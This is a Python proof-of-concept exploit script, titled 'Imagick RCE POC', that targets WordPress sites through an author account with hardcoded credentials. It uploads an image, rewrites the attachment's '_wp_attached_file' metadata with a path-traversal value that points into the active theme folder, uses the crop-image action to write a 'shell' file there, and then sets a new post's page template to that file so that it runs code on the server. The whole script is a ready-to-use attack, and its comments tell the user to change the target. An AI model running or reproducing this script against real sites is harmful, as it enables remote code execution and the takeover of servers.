#!/usr/bin/python3

######################
## Imagick RCE POC  ##
######################
import requests
import re

url_root='http://192.168.216.129:8080/' #change it your target
theme='twentyseventeen'
current_date='2019/10/' #change year, month as current date
filename = "rce.jpg"

session = requests.Session()
creds={'log':'author','pwd':'author4wp498','wp-submit':'Log In','redirect_to':'{url}wp-admin/'.format(url=url_root),'testcookie':1}
tmp={'wordpress_test_cookie':'WP Cookie check'}
r=session.post(url_root+'wp-login.php',cookies=tmp,data=creds)
wp_init_cookies=session.cookies

#get nonce
response = requests.get('{url}wp-admin/media-new.php'.format(url=url_root),cookies=wp_init_cookies)
_wp_nonce = re.findall(r'name="_wpnonce" value="(\w+)"',response.text)[0]


#uploading image
data = {
    'post_id': '0',
    '_wp_http_referer': '/wp-admin/media-new.php',
    '_wpnonce': _wp_nonce,
    'action': 'upload_attachement',
    'html-upload': 'Upload'
}
evil = {'async-upload':(filename, open(filename, 'rb'))}
upload_result = session.post(url_root+'wp-admin/async-upload.php', data=data, files=evil, cookies=wp_init_cookies)
image_id=upload_result.text
print(f'Image ID: {image_id}')

#First exploit :changing metadata
#Part 1 create folder ==> evil.jpg?/x
response=requests.get(url_root+'wp-admin/post.php?post='+image_id+'&action=edit',cookies=wp_init_cookies)
_wpnonce=re.findall(r'name="_wpnonce" value="(\w+)"',response.text)[0]
ajax_nonce = re.findall(r'imageEdit\.open\( \w+, "(\w+)"',response.text)[0]
print(ajax_nonce)
data={'_wpnonce':_wpnonce,
'action':'editpost',
'post_ID':image_id,
'meta_input[_wp_attached_file]':current_date+filename+'?/x'
}
response=requests.post(url_root+'wp-admin/post.php',data=data, cookies=wp_init_cookies)

#Creating file with wrop-image
data={'action':'crop-image',
'_ajax_nonce':ajax_nonce,
'id':image_id,
'cropDetails[x1]':0,
'cropDetails[y1]':0,
'cropDetails[width]':400,
'cropDetails[height]':300,
'cropDetails[dst_width]':10,
'cropDetails[dst_height]':10}
response=requests.post(url_root+'wp-admin/admin-ajax.php',data=data, cookies=wp_init_cookies)

#Part 2 creating file into current theme
data={'_wpnonce':_wpnonce,
'action':'editpost',
'post_ID':image_id,
'meta_input[_wp_attached_file]':current_date+filename+'?/../../../../themes/'+theme+'/shell'
}
response=requests.post(url_root+'wp-admin/post.php',data=data, cookies=wp_init_cookies)
data={'action':'crop-image',
'_ajax_nonce':ajax_nonce,
'id':image_id,
'cropDetails[x1]':0,
'cropDetails[y1]':0,
'cropDetails[width]':400,
'cropDetails[height]':300,
'cropDetails[dst_width]':10,
'cropDetails[dst_height]':10}
response=requests.post(url_root+'wp-admin/admin-ajax.php',data=data, cookies=wp_init_cookies)
print(response.text)

#Including into theme
response=requests.post(url_root+'wp-admin/post-new.php', cookies=wp_init_cookies)
_wpnonce=re.findall(r'name="_wpnonce" value="(\w+)"',response.text)[0]
post_id=re.findall(r'"post":{"id":(\w+),',response.text)[0]
print(f'Post ID: {post_id}')

data={'_wpnonce':_wpnonce,
'action':'editpost',
'post_ID':post_id,
'post_title':'vsec',
'post_name':'rce',
'meta_input[_wp_page_template]':'cropped-shell.jpg'
}
response=requests.post(url_root+'wp-admin/post.php',data=data, cookies=wp_init_cookies)

print(f'Rce at {url_root}?p={post_id}')